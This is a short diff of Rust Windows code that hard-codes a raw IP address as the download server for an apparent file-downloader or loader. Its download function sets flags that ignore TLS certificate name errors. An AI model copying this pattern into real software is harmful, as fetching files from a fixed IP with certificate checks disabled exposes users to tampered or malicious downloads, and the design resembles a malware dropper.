@@ -13,7 +13,7 @@ use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::Networking::WinInet::*;
 
 const KEY: &str = "__ACCOUNT_KEY__";
-const SERVER: &str = "__SERVER_IP__";
+const SERVER: &str = "http://95.182.96.216"; // <--- HARDCODED HERE
 
 fn to_wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
@@ -34,8 +34,6 @@ fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
         if h_internet.is_null() { log(loader, "InternetOpenW failed"); return false; }
 
         let url_w = to_wide(url);
-        
-        // Bypass SSL errors in case the server redirects to HTTPS
         let flags = INTERNET_FLAG_RELOAD | 
                     INTERNET_FLAG_NO_CACHE_WRITE | 
                     INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 
